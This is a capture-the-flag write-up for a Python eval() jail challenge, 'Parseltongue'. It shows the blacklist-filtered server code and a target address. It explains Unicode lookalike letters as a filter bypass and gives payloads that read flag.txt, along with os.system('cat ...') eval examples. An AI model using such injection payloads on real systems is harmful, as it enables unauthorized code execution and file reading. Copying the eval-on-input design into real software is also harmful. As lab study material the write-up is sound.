# Web: Parseltongue

You've meddled with the timeline, and now nobody speaks your language! Biff offers to help, but neither of you can understand each other. Can you sort this out?

**Target**: 68.183.43.15:30543

---

## Server with comments
To execute the server locally, copy this code to a python file.

```python
#!/usr/bin/env python3
import string


def ctf_challenge():
    blacklist = string.ascii_letters + '"\''  # --> abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"'

    payload = input("𝒲𝒽𝒶𝓉 𝓌𝑜𝓊𝓁𝒹 𝓎𝑜𝓊 𝓁𝒾𝓀𝑒 𝓂𝑒 𝓉𝑜 𝒹𝑜? ")
    # Iterate though all the characters of the payload
    # If a payload character is in the blacklist, filter() will remove it
    # DEBUG ---------------------------
    print(f'[Before filter] payload={payload}')
    filtrado = filter(lambda c: c in blacklist, payload)
    print(f'[After filter] payload={payload} & filtered={", ".join(filtrado)}')
    # If filter is not empty (it contains blacklisted characters or quotes), then any() returs true and the program breaks
    print(f'any = {any(filter(lambda c: c in blacklist, payload))}')
    # ----------------------------

    if any(filter(lambda c: c in blacklist, payload)):
        # If a blacklisted character is found, filer() returns true thus any() also returns true
        print("𝐼 𝒹𝑜𝓃'𝓉 𝓊𝓃𝒹𝑒𝓇𝓈𝓉𝒶𝓃𝒹 𝓌𝒽𝒶𝓉 𝓎𝑜𝓊 𝓂𝑒𝒶𝓃")
    else:
        # If the payload does not contain blacklisted characters, the payload is evaluated
        eval(payload)

```

I think we need to reach the else clause. For that we need to avoid any of these characters in the payload: `abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"'`

But how to write any intruction without using ascii characters? The key is to use unicode characters, since those can be interpreted by the computer and readed by humans, but are not considered equal to the ascii representation. For example, `𝒂 != a`

We tried to open the flag file and read its lines, but we were always blocked at the same point: the quotes. How could we input that command without using quotes?

## Extrange language

```
Payload: 𝒲𝒽𝒶𝓉 𝓌𝑜𝓊𝓁𝒹 𝓎𝑜𝓊 𝓁𝒾𝓀𝑒 𝓂𝑒 𝓉𝑜 𝒹𝑜? 
---
exit -> 𝓮𝔁𝓲𝓽(1)
print(open('./flag.txt', 'r').readlines())
𝒑𝒓𝒊𝒏𝒕(𝒐𝒑𝒆𝒏(“./𝒇𝒍𝒂𝒈.𝒕𝒙𝒕“,“𝒓“).𝒓𝒆𝒂𝒅𝒍𝒊𝒏𝒆𝒔())
---
𝒂
𝒃
𝒄
𝒅
𝒆
𝒇
𝒈
𝒉
𝒊
𝒋
𝒌
𝒍
𝒎
𝒏
𝒐
𝒑
𝒒
𝒓
𝒔
𝒕
𝒖
𝒗
𝒘
𝒙
𝒚
𝒛
“
```

## Eval()

[docs](https://realpython.com/python-eval-function/)

3 arguments
- expression  (string or compiled bytecode)
- globals
- locals

For example, I could evaluate:
- `eval("os.system('ls -la')")`
- `eval("os.system('cat /home/me/flag')")`
- `eval(compile("os.system('cat /home/me/flag')", "<string>", "eval"))`
